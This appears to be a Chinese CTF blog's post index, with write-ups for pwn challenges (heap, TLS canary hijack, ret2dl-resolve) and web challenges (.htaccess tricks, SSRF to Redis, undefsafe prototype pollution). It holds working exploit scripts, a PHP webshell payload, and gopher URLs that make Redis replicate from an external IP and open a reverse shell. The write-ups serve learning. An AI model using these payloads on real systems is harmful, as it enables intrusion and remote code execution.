change_gender(idx, gender):    menu(666)    r.recvuntil(b&#x27;Please input index?&#x27;)    r.send(bytes(str(idx), encoding=&#x27;utf8&#x27;))    r.recvuntil(b&quot;2.Girl:&quot;)    r.send(bytes(str(gender), encoding=&#x27;utf8&#x27;))context.log_level = &#x27;debug&#x27;create(0, 1, b&#x27;cml&#x27;)delete(0)change_gender(0, 2)delete(0)create(0, 1, b&#x27;cml&#x27;)create(1, 1, b&#x27;cml&#x27;)create(2, 1, b&#x27;cml&#x27;)delete(1)delete(2)show(0)r.recvuntil(b&#x27;Gender: &#x27;)heap_base = u64(r.recv(6).ljust(8, b&#x27;\\x00&#x27;))-0x10print(&quot;heap_base=&gt;&quot;, hex(heap_base))create(1, 1, b&#x27;cml&#x27;)create(2, 1, b&#x27;cml&#x27;)delete(1)delete(2)change_name(0, p64(heap_base+0x10)[:-1])create(1, 1, b&#x27;cml&#x27;)create(2, 2, b&#x27;\\x00&#x27;*7)edit(2, b&#x27;\\x00&#x27;*14+b&#x27;\\x08&#x27;)delete(1)show(0)r.recvuntil(b&#x27;Gender: &#x27;)main_arena_96 = u64(r.recv(6).ljust(8, b&#x27;\\x00&#x27;))malloc_hook = (main_arena_96 &amp; 0xFFFFFFFFFFFFF000) + \\    (libc.symbols[&#x27;__malloc_hook&#x27;] &amp; 0xfff)libc_base = malloc_hook-libc.symbols[&#x27;__malloc_hook&#x27;]print(&#x27;libc_base=&gt;&#x27;, hex(libc_base))setcontext_addr = libc_base+libc.symbols[&#x27;setcontext&#x27;]+61free_hook = libc_base+libc.symbols[&#x27;__free_hook&#x27;]open_addr = libc_base+libc.symbols[&#x27;open&#x27;]read_addr = libc_base+libc.symbols[&#x27;read&#x27;]puts_addr = libc_base+libc.symbols[&#x27;puts&#x27;]pop_rdi = libc_base+next(libc.search(asm(&#x27;pop rdi\\nret&#x27;)))pop_rsi = libc_base+next(libc.search(asm(&#x27;pop rsi\\nret&#x27;)))pop_rdx_r12 = libc_base+0x000000000011c371ret_addr = libc_base+next(libc.search(asm(&#x27;ret&#x27;)))gadget = libc_base+0x1546f0+576&#x27;&#x27;&#x27;   0x00007f3ddba96930 &lt;+576&gt;:\tmov    rdx,QWORD PTR [rdi+0x8]   0x00007f3ddba96934 &lt;+580&gt;:\tmov    QWORD PTR [rsp],rax   0x00007f3ddba96938 &lt;+584&gt;:\tcall   QWORD PTR [rdx+0x20]&#x27;&#x27;&#x27;bss = libc_base+libc.bss()+0x300flag_addr = heap_base+0x4c0rop_chain = p64(pop_rdi)+p64(flag_addr)+p64(open_addr)rop_chain += p64(pop_rdi)+p64(4)+p64(pop_rsi)+p64(bss) + \\    p64(pop_rdx_r12)+p64(0x30)+p64(0)+p64(read_addr)rop_chain += p64(pop_rdi)+p64(bss)+p64(puts_addr)edit(2, b&#x27;\\x00&#x27;*15)create(1, 1, b&#x27;aaaaaaa&#x27;)create(3, 1, b&#x27;flag\\x00\\x00\\x00&#x27;)edit(3, rop_chain)print(hex(puts_addr))rop_chain_addr = heap_base+0x4d0create(4, 1, b&#x27;aaaaaaa&#x27;)arg_addr = heap_base+0x5e0payload = b&#x27;\\x00&#x27;*14+b&#x27;\\x01&#x27;payload = payload.ljust(0xe8, b&#x27;\\x00&#x27;)+p64(arg_addr)edit(2, payload[:-1])create(5, 1, b&#x27;shell&#x27;)payload = p64(0)+p64(arg_addr)payload = payload.ljust(0x20, b&#x27;\\x00&#x27;)+p64(setcontext_addr)payload = payload.ljust(0xa0, b&#x27;\\x00&#x27;) + \\    p64(rop_chain_addr)+p64(setcontext_addr+334-61)edit(4, payload)payload = b&#x27;\\x00&#x27;*14+b&#x27;\\x01&#x27;payload = payload.ljust(0xe8, b&#x27;\\x00&#x27;)+p64(free_hook)edit(2, payload[:-1])create(6, 1, p64(gadget)[:-1])delete(5)r.interactive()\n\n解法2：\n在我的这篇文章中，讲了另一个方式劫持栈，也就是通过environ泄漏栈地址，计算与main函数ret时的栈地址的偏移量进行劫持，这里主要是讲解gadget就不在赘述\n","categories":["pwn"],"tags":["堆利用技巧","tcache double free"]},{"title":"关于.htaccess的技巧记录","url":"/2021/10/30/%E5%85%B3%E4%BA%8E-htaccess%E7%9A%84%E6%8A%80%E5%B7%A7%E8%AE%B0%E5%BD%95/","content":"百度词条.htaccess文件(或者”分布式配置文件”）,全称是Hypertext Access(超文本入口)。提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。\n相关的基础概念.htaccess当中的注释，#是单行注释，并且\\可以拼接两行\n作用范围：.htaccess作用于当前目录和他的所有子目录\n在使用.htaccess的时候需要apache配置文件中ALLowOverride All当然还可以重命名AccessFileName .config\n.htaccess指令SetHandler强制所有匹配文件被指定处理器处理\nAddType application/x-httpd-php .gifSetHandler handler-name|None\n\n在CTF常用用法：\nSethandler application/x-httpd-php\n\n那么当前目录下以及子目录的所有文件都会被当作php执行\nAddType将指定的文件尾缀映射到制定内容的类型\nAddType media-type extensive [extensive] ...\n\nCTF的常用用法：\nAddType application/x-httpd-php .gif\n\n此时会将.gif的文件当作php被执行\nphp_value当使用 PHP 作为 Apache 模块时，可以用 Apache 的配置文件（例如 httpd.conf）或 .htaccess 文件中的指令来修改 PHP 的配置设定。但是需要有开启 AllowOverride Options 或 AllowOverride All 权限才可以。\nphp_value 指令用来设定指定的 PHP 的配置值。要清除先前设定的值，把 value 设为 none。但是 php_value 不能用来设定布尔值，如果要设定布尔值的话应该用 php_flag。\nphp_value name value\n\n\n在php官网有能够在.htaccess设定的内容，所以只有PHP_INI_PREDIR和PHP_INI_ALL才能被.htaccess设定\n在CTF中常用\nphp_value auto_prepend_file image.png\n\n在访问一个php文件会在访问之前包含image.png文件\nphp_flag用来设定bool类型的配置项\nphp_flag name on|off\n\nCTF常用\nphp_flag engine 0\n\n造成源码泄漏\n例题[羊城杯 2020]easy php题目源码index.php:\n&lt;?php$files = scandir(&#x27;./&#x27;);foreach ($files as $file) &#123;    if (is_file($file)) &#123;        if ($file !== &quot;index.php&quot;) &#123;            unlink($file);        &#125;    &#125;&#125;if (!isset($_GET[&#x27;content&#x27;]) || !isset($_GET[&#x27;filename&#x27;])) &#123;    highlight_file(__FILE__);    die();&#125;$content = $_GET[&#x27;content&#x27;];if (stristr($content, &#x27;on&#x27;) || stristr($content, &#x27;html&#x27;) || stristr($content, &#x27;type&#x27;) || stristr($content, &#x27;flag&#x27;) || stristr($content, &#x27;upload&#x27;) || stristr($content, &#x27;file&#x27;)) &#123;    echo &quot;Hacker&quot;;    die();&#125;$filename = $_GET[&#x27;filename&#x27;];if (preg_match(&quot;/[^a-z\\.]/&quot;, $filename) == 1) &#123;    echo &quot;Hacker&quot;;    die();&#125;$files = scandir(&#x27;./&#x27;);foreach ($files as $file) &#123;    if (is_file($file)) &#123;        if ($file !== &quot;index.php&quot;) &#123;            unlink($file);        &#125;    &#125;&#125;file_put_contents($filename, $content . &quot;\\nHello, world&quot;);\n\n在访问文件的时候会先把当前文件夹下的所有文件都删除了，然后可以上传content和filename，但是当你上传一个一句话木马的时候会发现这个文件没法解析，所以考虑使用.htaccess文件\n直接写出payload\nphp_value auto_prepend_fil\\ e .htaccess #&lt;?php system($_POST[1]);die();?&gt;\\ \n\n\n\n","categories":["web"],"tags":[".htaccess"]},{"title":"劫持TLS结构","url":"/2022/02/04/%E5%8A%AB%E6%8C%81TLS%E7%BB%93%E6%9E%84/","content":"TLS的简单介绍我这里就不详细说明TLS的实现了，因为太复杂了(我没看懂)。具体实现过程可以参考https://dere.press/2020/10/18/glibc-tls/\n对于TLS其实是线程局部存储 (TLS) 是一种存储持续期（storage duration），对象的存储是在线程开始时分配，线程结束时回收，每个线程有该对象自己的实例。\n对于TLS的变量是每一个线程所独有的，维护canary的TCB结构的也就是tls。他会在每一个线程申请自己的空间，并且在验证时也是拿自己线程所在的作比较，我们可以通过canary的实现来观察TCB结构体的位置。\n\n很好可以理解实在fs偏移28个位置的值作为canary。\n下面是TCB结构体的定义:\ntypedef struct&#123;void *tcb;/* Pointer to the TCB.Not necessarily thethread descriptor used by libpthread.*/dtv_t *dtv;void *self;/* Pointer to the thread descriptor.*/int multiple_threads;int gscope_flag;uintptr_t sysinfo;uintptr_t stack_guard;uintptr_t pointer_guard;unsigned long int vgetcpu_cache[2];/* Bit 0: X86_FEATURE_1_IBT.Bit 1: X86_FEATURE_1_SHSTK.*/unsigned int feature_1;int __glibc_unused1;/* Reservation of some values for the TM ABI.*/void *__private_tm[4];/* GCC split stack support.*/void *__private_ss;/* The lowest address of shadow stack,*/unsigned long long int ssp_base;/* Must be kept even if it is no longer used by glibc since programs,like AddressSanitizer, depend on the size of tcbhead_t.*/__128bits __glibc_unused2[8][4] __attribute__ ((aligned (32)));void *__padding[8];&#125; tcbhead_t;\n\n也可以看到在fs:28h的位置也就是stack_guard\nQ1: HGAME enter_the_evil_pwn_land检查保护\n当时就是这道题卡住了我感觉自己好菜没资格打比赛就没打了。\n解题思路unsigned __int64 __fastcall test_thread(void *a1)&#123;  int i; // [rsp+8h] [rbp-38h]  char s[40]; // [rsp+10h] [rbp-30h] BYREF  unsigned __int64 v4; // [rsp+38h] [rbp-8h]  v4 = __readfsqword(0x28u);  for ( i = 0; i &lt;= 0xFFF; ++i )  &#123;    read(0, &amp;s[i], 1uLL);    if ( s[i] == 10 )      break;  &#125;  puts(s);  return __readfsqword(0x28u) ^ v4;&#125;\n\n题目的内容很简单，存在0x1000个字节的栈溢出，但是只有一次puts的机会。\n所以，按照以往思路覆盖canary的\\x00显然是不能够的，所以我们直接劫持TLS。\n\n可以看到canary的值是0xd491330997329e00。\n\n再看TCB结构体可以看到canary确实就在偏移为0x28的地址上。\n\n可以看到TCB结构体还正在栈上。因为我们是写入0x1000字节所以显然能到这个位置。\n\nread开始的位置距离TCB结构体的距离是0x840。\n综上得出exp:from pwn import *r = process(&#x27;./a.out&#x27;)elf = ELF(&#x27;./a.out&#x27;)libc = ELF(&#x27;./libc-2.31.so&#x27;)context.log_level = &#x27;debug&#x27;puts_plt = elf.plt[&#x27;puts&#x27;]puts_got = elf.got[&#x27;puts&#x27;]pop_rdi = 0x0000000000401363ret_addr = 0x000000000040101avuln_fun = elf.sym[&#x27;test_thread&#x27;]r.sendline(b&#x27;a&#x27;*0x20)r.recvline()fsbase = u64((b&#x27;\\x00&#x27;+r.recvuntil(b&#x27;\\n&#x27;, drop=True)).ljust(8, b&#x27;\\x00&#x27;))print(hex(fsbase))payload = b&#x27;a&#x27;*(0x30-0x8)+p64(0)*2+p64(pop_rdi) + \\    p64(puts_got)+p64(puts_plt)+p64(vuln_fun)payload = payload.ljust(0x840)+p64(fsbase)*3+p64(0)*3r.sendline(payload)r.recvuntil(b&#x27;\\n&#x27;)puts_addr = u64(r.recvuntil(b&#x27;\\n&#x27;, drop=True).ljust(8, b&#x27;\\x00&#x27;))libc_base = puts_addr-libc.sym[&#x27;puts&#x27;]system_addr = libc_base+libc.sym[&#x27;system&#x27;]bin_sh_addr = libc_base+next(libc.search(b&#x27;/bin/sh&#x27;))gdb.attach(r)pop_rsi = libc_base + 0x0000000000027529pop_rdx_r12 = libc_base + 0x000000000011c371payload = b&#x27;a&#x27;*(0x30-0x8)+p64(0)*2+p64(pop_rdi) + \\    p64(bin_sh_addr)+p64(pop_rsi)+p64(0) + \\    p64(pop_rdx_r12)+p64(0)*2+p64(libc.sym[&#x27;execve&#x27;]+libc_base)r.sendline(payload)r.interactive()\n\nQ2: BUUCTF-PWN gyctf_2020_bfnote保护检查\n这道题目需要昨天的re2dlresolve的知识，没看过的师傅可以去看看ret2dl-resolve\n解题思路unsigned int __cdecl main()&#123;  int i; // [esp+4h] [ebp-54h]  int size; // [esp+8h] [ebp-50h]  char *v3; // [esp+Ch] [ebp-4Ch]  int v4; // [esp+14h] [ebp-44h]  char s[50]; // [esp+1Ah] [ebp-3Eh] BYREF  unsigned int v6; // [esp+4Ch] [ebp-Ch]  v6 = __readgsdword(0x14u);  start_menu();  fwrite(&quot;\\nGive your description : &quot;, 1u, 0x19u, stdout);  memset(s, 0, sizeof(s));  read_0(0, s, 0x600);                          // 栈溢出  fwrite(&quot;Give your postscript : &quot;, 1u, 0x17u, stdout);  memset(&amp;unk_804A060, 0, 0x64u);  read_0(0, &amp;unk_804A060, 0x600);  fwrite(&quot;\\nGive your notebook size : &quot;, 1u, 0x1Bu, stdout);  size = input_int();  v3 = malloc(size);  memset(v3, 0, size);  fwrite(&quot;Give your title size : &quot;, 1u, 0x17u, stdout);  v4 = input_int();  for ( i = v4; size - 0x20 &lt; i; i = input_int() )    fwrite(&quot;invalid ! please re-enter :\\n&quot;, 1u, 0x1Cu, stdout);  fwrite(&quot;\\nGive your title : &quot;, 1u, 0x13u, stdout);  read_0(0, v3, i);                             fwrite(&quot;Give your note : &quot;, 1u, 0x11u, stdout);  read(0, &amp;v3[v4 + 16], size - v4 - 16);        // 任意地址写  fwrite(&quot;\\nnow , check your notebook :\\n&quot;, 1u, 0x1Du, stdout);  fprintf(stdout, &quot;title : %s&quot;, v3);  fprintf(stdout, &quot;note : %s&quot;, &amp;v3[v4 + 16]);  return __readgsdword(0x14u) ^ v6;&#125;\n\n别人可以用tls直接查看这个地址，但是我试了几次都不行所以就用了search查找canary来查找\n\n可以看到他存放的位置其实是共享映射区域，所以他的相对偏移是固定的。所以如果我们malloc一个很大的chunk(size&gt;=0x20000)，那么系统就被迫使用mmap给我们分配，根据mmap的机制我们分配的chunk就一定在tcbhead_t地址的低地址处。再根据上面main函数的漏洞就很容易修改掉canary的值了。\n思路就是分配一个大小为0x20000的堆块到canary上面去，然后计算他们之间偏移，利用上面的任意地址写修改canary的值。但是由于题目当中的输出函数是fwrite或者fprintf。我们的ROPgadget不够，所以选择使用ret2dl-resolve。\n这道题恶心人的一点\n\n在main函数最后并不是普通的leave  retn，在最后的时候esp的值会变到ebp+var_4-4的值，所以在构造ROP的时候不能在栈上面构造。\n最终得到exp:from pwn import *r = remote(&quot;node4.buuoj.cn&quot;, 28441)# r = process(&quot;./gyctf_2020_bfnote&quot;)elf = ELF(&quot;./gyctf_2020_bfnote&quot;)libc = ELF(&#x27;../buu_libc/x86/libc-2.23.so&#x27;)bss_start = 0x0804A060gap = 0x500stack_overflow = b&#x27;a&#x27; * (0x3e - 0xc + 0x8) + p64(bss_start + gap + 0x4)r.recvuntil(b&#x27;Give your description : &#x27;)r.send(stack_overflow)r.recvuntil(b&#x27;Give your postscript : &#x27;)fake_sym = p32(bss_start + gap + 0x4 * 4 + 0x8 - 0x80482C8) + \\    p32(0) + p32(0) + p32(0x12)fake_rel = p32(bss_start) + p32(0x7 + ((bss_start + gap + 0x4 *                                        4 + 0x8 + 0x8 + 0x8 - 0x080481D8) // 0x10) * 0x100)r.send(b&#x27;\\x00&#x27; * gap + p32(0x08048450) + p32(bss_start + gap + 0x4 * 4 + 0x8 * 2 - 0x080483D0) +       p32(0) + p32(bss_start + gap + 0x4 * 4) + b&#x27;/bin/sh\\x00&#x27; + b&#x27;system\\x00\\x00&#x27; + fake_rel + fake_sym)r.recvuntil(b&#x27;Give your notebook size : &#x27;)r.send(bytes(str(0x20000), encoding=&#x27;utf8&#x27;))r.recvuntil(&#x27;Give your title size : &#x27;)r.send(bytes(str(0xf7d22714 - 0xf7d01008 - 16), encoding=&#x27;utf8&#x27;))r.recvuntil(&#x27;invalid ! please re-enter :\\n&#x27;)r.send(b&#x27;4&#x27;)r.recvuntil(&#x27;Give your title : &#x27;)r.send(&#x27;a&#x27;)r.recvuntil(&#x27;Give your note : &#x27;)r.send(&#x27;aaaa&#x27;)r.interactive()\n\n参考链接https://blog.csdn.net/seaaseesa/article/details/104479071\n(我挺喜欢这个博主的不过他这次是伪造的link_map把我都看蒙了，后面发现都用的p32那就用32位的方式伪造呗，这样简便很多)\n","categories":["pwn"],"tags":["ret2dl-runtime-resolve","劫持TLS结构"]},{"title":"网鼎杯_2020_玄武组_SSRFMe","url":"/2021/11/16/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E7%8E%84%E6%AD%A6%E7%BB%84-SSRFMe/","content":"题目源码&lt;?phpfunction check_inner_ip($url)&#123;    $match_result=preg_match(&#x27;/^(http|https|gopher|dict)?:\\/\\/.*(\\/)?.*$/&#x27;,$url);    if (!$match_result)    &#123;        die(&#x27;url fomat error&#x27;);    &#125;    try    &#123;        $url_parse=parse_url($url);    &#125;    catch(Exception $e)    &#123;        die(&#x27;url fomat error&#x27;);        return false;    &#125;    $hostname=$url_parse[&#x27;host&#x27;];    $ip=gethostbyname($hostname);    $int_ip=ip2long($ip);    return ip2long(&#x27;127.0.0.0&#x27;)&gt;&gt;24 == $int_ip&gt;&gt;24 || ip2long(&#x27;10.0.0.0&#x27;)&gt;&gt;24 == $int_ip&gt;&gt;24 || ip2long(&#x27;172.16.0.0&#x27;)&gt;&gt;20 == $int_ip&gt;&gt;20 || ip2long(&#x27;192.168.0.0&#x27;)&gt;&gt;16 == $int_ip&gt;&gt;16;&#125;function safe_request_url($url)&#123;    if (check_inner_ip($url))    &#123;        echo $url.&#x27; is inner ip&#x27;;    &#125;    else    &#123;        $ch = curl_init();        curl_setopt($ch, CURLOPT_URL, $url);        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);        curl_setopt($ch, CURLOPT_HEADER, 0);        $output = curl_exec($ch);        $result_info = curl_getinfo($ch);        if ($result_info[&#x27;redirect_url&#x27;])        &#123;            safe_request_url($result_info[&#x27;redirect_url&#x27;]);        &#125;        curl_close($ch);        var_dump($output);    &#125;&#125;if(isset($_GET[&#x27;url&#x27;]))&#123;    $url = $_GET[&#x27;url&#x27;];    if(!empty($url))&#123;        safe_request_url($url);    &#125;&#125;else&#123;    highlight_file(__FILE__);&#125;// Please visit hint.php locally.?&gt;\n\n在这里只允许使用http/https/gopher/dict协议，并且禁止了一些ip，查看hint很简单，直接0.0.0.0就行\nstring(1342) &quot; &lt;?phpif($_SERVER[&#x27;REMOTE_ADDR&#x27;]===&quot;127.0.0.1&quot;)&#123;  highlight_file(__FILE__);&#125;if(isset($_POST[&#x27;file&#x27;]))&#123;  file_put_contents($_POST[&#x27;file&#x27;],&quot;&lt;?php echo &#x27;redispass is root&#x27;;exit();&quot;.$_POST[&#x27;file&#x27;]);&#125;&quot;\n\n返回了这样的数据，直接写了redis的密码是root，又有gopher协议，思路就清晰了。\n利用思路构造一个恶意的redis服务器https://github.com/xmsec/redis-ssrf然后让远程的redis连接到恶意的redis服务器，紧接着远程主机会同步恶意主机的exp，然后控制主机连接本地监听就可以getshell了\ngopher://0.0.0.0:6379/_auth%2520root%250d%250aconfig%2520set%2520dir%2520/tmp/%250d%250aquitgopher://0.0.0.0:6379/_auth%2520root%250d%250aconfig%2520set%2520dbfilename%2520exp.so%250d%250aslaveof%2520103.215.81.199%252010977%250d%250aquit\n\n第一步是将dir设置为/tmp/，第二步是将dbfilename设置为exp.so然后设置连接到我们的服务\ngopher://0.0.0.0:6379/_auth%2520root%250d%250amodule%2520load%2520/tmp/exp.so%250d%250asystem.rev%2520103.215.81.199%252010232%250d%250aquit\n\n这一步是让目标主机使用这个应用这个exp文件然后远程连接我们的服务\n\n这样就获得了反弹shell，穷困大学生没有服务器就用的隧道来代替\n","categories":["web-buuctf"],"tags":["ssrf","redis主从复制"]},{"title":"网鼎杯_2020_青龙组_notes","url":"/2021/11/22/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84-notes/","content":"知识点源代码中undefsafe不知道是什么搜了一下就出现了unsafe漏洞\nhttps://skysec.top/2020/06/22/CVE-2019-10795-undefsafe-Prototype-Pollution-Vulnerability/\n// 上面链接里面的内容var a = require(&quot;undefsafe&quot;);var test = &#123;&#125;console.log(&#x27;this is &#x27;+test)// this is [object Object]a(test,&#x27;__proto__.toString&#x27;,function()&#123; return &#x27;just a evil!&#x27;&#125;)console.log(&#x27;this is &#x27;+test)// this is just a evil!\n\n代码审计题目直接给了源码\nvar express = require(&#x27;express&#x27;);var path = require(&#x27;path&#x27;);const undefsafe = require(&#x27;undefsafe&#x27;);const &#123; exec &#125; = require(&#x27;child_process&#x27;);var app = express();class Notes &#123;    constructor() &#123;        this.owner = &quot;whoknows&quot;;        this.num = 0;        this.note_list = &#123;&#125;;    &#125;    write_note(author, raw_note) &#123;        this.note_list[(this.num++).toString()] = &#123;&quot;author&quot;: author,&quot;raw_note&quot;:raw_note&#125;;    &#125;    get_note(id) &#123;        var r = &#123;&#125;        undefsafe(r, id, undefsafe(this.note_list, id));        return r;    &#125;    edit_note(id, author, raw) &#123;        undefsafe(this.note_list, id + &#x27;.author&#x27;, author);        undefsafe(this.note_list, id + &#x27;.raw_note&#x27;, raw);    &#125;    get_all_notes() &#123;        return this.note_list;    &#125;    remove_note(id) &#123;        delete this.note_list[id];    &#125;&#125;var notes = new Notes();notes.write_note(&quot;nobody&quot;, &quot;this is nobody&#x27;s first note&quot;);app.set(&#x27;views&#x27;, path.join(__dirname, &#x27;views&#x27;));app.set(&#x27;view engine&#x27;, &#x27;pug&#x27;);app.use(express.json());app.use(express.urlencoded(&#123; extended: false &#125;));app.use(express.static(path.join(__dirname, &#x27;public&#x27;)));app.get(&#x27;/&#x27;, function(req, res, next) &#123;  res.render(&#x27;index&#x27;, &#123; title: &#x27;Notebook&#x27; &#125;);&#125;);app.route(&#x27;/add_note&#x27;)    .get(function(req, res) &#123;        res.render(&#x27;mess&#x27;, &#123;message: &#x27;please use POST to add a note&#x27;&#125;);    &#125;)    .post(function(req, res) &#123;        let author = req.body.author;        let raw = req.body.raw;        if (author &amp;&amp; raw) &#123;            notes.write_note(author, raw);            res.render(&#x27;mess&#x27;, &#123;message: &quot;add note sucess&quot;&#125;);        &#125; else &#123;            res.render(&#x27;mess&#x27;, &#123;message: &quot;did not add note&quot;&#125;);        &#125;    &#125;)app.route(&#x27;/edit_note&#x27;)    .get(function(req, res) &#123;        res.render(&#x27;mess&#x27;, &#123;message: &quot;please use POST to edit a note&quot;&#125;);    &#125;)    .post(function(req, res) &#123;        let id = req.body.id;        let author = req.body.author;        let enote = req.body.raw;        if (id &amp;&amp; author &amp;&amp; enote) &#123;            notes.edit_note(id, author, enote);            res.render(&#x27;mess&#x27;, &#123;message: &quot;edit note sucess&quot;&#125;);        &#125; else &#123;            res.render(&#x27;mess&#x27;, &#123;message: &quot;edit note failed&quot;&#125;);        &#125;    &#125;)app.route(&#x27;/delete_note&#x27;)    .get(function(req, res) &#123;        res.render(&#x27;mess&#x27;, &#123;message: &quot;please use POST to delete a note&quot;&#125;);    &#125;)    .post(function(req, res) &#123;        let id = req.body.id;        if (id) &#123;            notes.remove_note(id);            res.render(&#x27;mess&#x27;, &#123;message: &quot;delete done&quot;&#125;);        &#125; else &#123;            res.render(&#x27;mess&#x27;, &#123;message: &quot;delete failed&quot;&#125;);        &#125;    &#125;)app.route(&#x27;/notes&#x27;)    .get(function(req, res) &#123;        let q = req.query.q;        let a_note;        if (typeof(q) === &quot;undefined&quot;) &#123;            a_note = notes.get_all_notes();        &#125; else &#123;            a_note = notes.get_note(q);        &#125;        res.render(&#x27;note&#x27;, &#123;list: a_note&#125;);    &#125;)app.route(&#x27;/status&#x27;)    .get(function(req, res) &#123;        let commands = &#123;            &quot;script-1&quot;: &quot;uptime&quot;,            &quot;script-2&quot;: &quot;free -m&quot;        &#125;;        for (let index in commands) &#123;            exec(commands[index], &#123;shell:&#x27;/bin/bash&#x27;&#125;, (err, stdout, stderr) =&gt; &#123;                if (err) &#123;                    return;                &#125;                console.log(`stdout: $&#123;stdout&#125;`);            &#125;);        &#125;        res.send(&#x27;OK&#x27;);        res.end();    &#125;)app.use(function(req, res, next) &#123;  res.status(404).send(&#x27;Sorry cant find that!&#x27;);&#125;);app.use(function(err, req, res, next) &#123;  console.error(err.stack);  res.status(500).send(&#x27;Something broke!&#x27;);&#125;);const port = 8080;app.listen(port, () =&gt; console.log(`Example app listening at http://localhost:$&#123;port&#125;`))\n\n可以看到漏洞函数很明显\nedit_note(id, author, raw) &#123;    undefsafe(this.note_list, id + &#x27;.author&#x27;, author);    undefsafe(this.note_list, id + &#x27;.raw_note&#x27;, raw);&#125;\n\n并且三个参数都是可控的，所以可以造成原型链污染\napp.route(&#x27;/status&#x27;)    .get(function(req, res) &#123;        let commands = &#123;            &quot;script-1&quot;: &quot;uptime&quot;,            &quot;script-2&quot;: &quot;free -m&quot;        &#125;;        for (let index in commands) &#123;            exec(commands[index], &#123;shell:&#x27;/bin/bash&#x27;&#125;, (err, stdout, stderr) =&gt; &#123;                if (err) &#123;                    return;                &#125;                console.log(`stdout: $&#123;stdout&#125;`);            &#125;);        &#125;        res.send(&#x27;OK&#x27;);        res.end();    &#125;)\n\n然后这里又是for循环执行命令\n利用过程其实思路就很明显了，污染commands然后执行我们想要的命令就可以了\n\n就可以获得反弹shell了\n","categories":["web-buuctf"],"tags":["原型链污染","代码审计"]},{"title":"长安“战疫”网络安全卫士守护赛wp","url":"/2022/01/08/%E9%95%BF%E5%AE%89%E2%80%9C%E6%88%98%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9Bwp/","content":"总的来说比赛挺简单的，因为pwn2没遇到过所以调试花费的时间比较多，没来的及做pwn3，不过pwn3看了好像是存在任意地址写漏洞，猜测是修改exit的got表之类的，后面复现了再发(当然有可能因为太懒不发了)。\npwn1add esp, 10hmov eax, 0mov ecx, [ebp+var_4]leavelea esp,[ecx-4]retn\n\n注意程序不是从原本的位置开始ret就好了\nfrom pwn import *elf = ELF(&#x27;./pwn1&#x27;)# r = process(&#x27;./pwn1&#x27;)r = remote(&#x27;113.201.14.253&#x27;, 16088)shell_addr = 0x8048540r.recvuntil(b&#x27;Gift:&#x27;)buf_addr = int(r.recvuntil(b&#x27;\\n&#x27;, drop=True)[2:], 16)payload = b&#x27;a&#x27;*(0x38-0x4)+p32(buf_addr+0x38+8)+p32(0)+p32(shell_addr)# r.sendline(b&#x27;a&#x27;*(0x38+0x4))r.sendline(payload)r.interactive()\n\npwn2off by one程序在create的时候存在off by one漏洞，具体思路，覆盖下方chunk，释放chunk进入unsortedbin泄漏main_arena，释放chunk进入tcache修改到malloc上面的地址\nfrom pwn import *elf = ELF(&#x27;./pwn2&#x27;)libc = ELF(&#x27;./libc-2.27.so&#x27;)# r = process(&#x27;./pwn2&#x27;)r = remote(&#x27;113.201.14.253&#x27;, 16066)context.log_level = &#x27;debug&#x27;one_gadget = 0x10a41cdef create(size, content):    r.recvuntil(b&#x27;Choice: &#x27;)    r.sendline(b&#x27;1&#x27;)    r.recvuntil(b&#x27;size: &#x27;)    r.sendline(bytes(str(size), encoding=&#x27;utf-8&#x27;))    r.recvuntil(b&#x27;content: &#x27;)    r.sendline(content)def edit(id, content):    r.recvuntil(b&#x27;Choice: &#x27;)    r.sendline(b&#x27;2&#x27;)    r.recvuntil(b&#x27;idx: &#x27;)    r.sendline(bytes(str(id), encoding=&#x27;utf-8&#x27;))    r.recvuntil(b&#x27;content: &#x27;)    r.sendline(content)def delete(id):    r.recvuntil(b&#x27;Choice: &#x27;)    r.sendline(b&#x27;3&#x27;)    r.recvuntil(b&#x27;idx: &#x27;)    r.sendline(bytes(str(id), encoding=&#x27;utf-8&#x27;))def show(id):    r.recvuntil(b&#x27;Choice: &#x27;)    r.sendline(b&#x27;4&#x27;)    r.recvuntil(b&#x27;idx: &#x27;)    r.sendline(bytes(str(id), encoding=&#x27;utf-8&#x27;))# gdb.attach(r)create(0x68, b&#x27;a&#x27;*0x68)    # 0create(0x100, b&#x27;a&#x27;*0x100)  # 1create(0x68, b&#x27;a&#x27;*0x68)    # 2create(0x88, b&#x27;a&#x27;*0x88)    # 3create(0xf8, b&#x27;a&#x27;*0xf8)    # 4create(0x88, b&#x27;a&#x27;*0x88)    # 5# delete(9)delete(0)create(0x68, b&#x27;a&#x27;*(0x68-0x8)+p64(0)+b&#x27;\\x80&#x27;)  # 0# 让chunk1覆盖掉chunk2delete(1)create(0x170, b&#x27;a&#x27;)  # 1delete(3)create(0x88, b&#x27;a&#x27;*(0x88-0x8)+p64(0)+b&#x27;\\x90&#x27;)  # 3delete(4)# chunk4覆盖掉chunk5create(0x180, b&#x27;a&#x27;)  # 4for i in range(7):    create(0x88, b&#x27;a&#x27;)for i in range(7):    delete(12-i)delete(5)# 让chunk5进入unsortedbin获得main_arena地址edit(4, b&#x27;a&#x27;*(0xf8+0x8-1))show(4)r.recvuntil(b&#x27;aaaaaaaaaaaaaa\\n&#x27;)main_arena_88 = u64(r.recvuntil(b&#x27;1.Add&#x27;, drop=True).ljust(8, b&#x27;\\x00&#x27;))print(hex(main_arena_88))malloc_hook = (main_arena_88 &amp; 0xFFFFFFFFFFFFF000) + \\    (libc.symbols[&#x27;__malloc_hook&#x27;] &amp; 0xfff)print(hex(malloc_hook))libc_base = malloc_hook-libc.symbols[&#x27;__malloc_hook&#x27;]one_gadget = libc_base+one_gadgetdelete(2)edit(1, b&#x27;a&#x27;*(0x100)+p64(0)+p64(0x70)+p64(malloc_hook-0x10))  # 2# 释放chunk2，进入tcache，修改fd指针create(0x68, b&#x27;a&#x27;)# gdb.attach(r)create(0x68, b&#x27;a&#x27;*0x10+p64(one_gadget))# 修改malloc_hookr.recvuntil(b&#x27;Choice: &#x27;)r.sendline(b&#x27;1&#x27;)r.recvuntil(b&#x27;size: &#x27;)r.sendline(b&#x27;1&#x27;)# 